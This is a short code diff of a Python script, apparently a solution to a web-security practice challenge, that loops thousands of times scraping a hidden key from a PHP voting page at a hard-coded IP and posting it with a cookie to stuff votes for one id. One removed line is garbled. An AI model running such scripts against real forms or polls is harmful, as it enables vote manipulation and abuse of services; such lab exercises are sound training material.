@@ -5,7 +5,7 @@ from bs4 import BeautifulSoup
 payload = {'id': 244, 'holdthedoor': 'Submit'}
 url = "http://158.69.76.135/level1.php"
 
-for i in range(25):ders = {'Cookie': 'HoldTheDoor={}'.format(secret)}
+for i in range(4096):
     # get the sites HTML
     site = requests.get(url)
     # scrape the site for its key
@@ -14,6 +14,5 @@ for i in range(25):ders = {'Cookie': 'HoldTheDoor={}'.format(secret)}
 
     # create and append our header
     headers = {'Cookie': 'HoldTheDoor={}'.format(secret)}
-    #payload.update({'key': new_cookie})
+    payload.update({'key': secret})
     r = requests.post(url, data=payload, headers=headers)
-print(r.text)
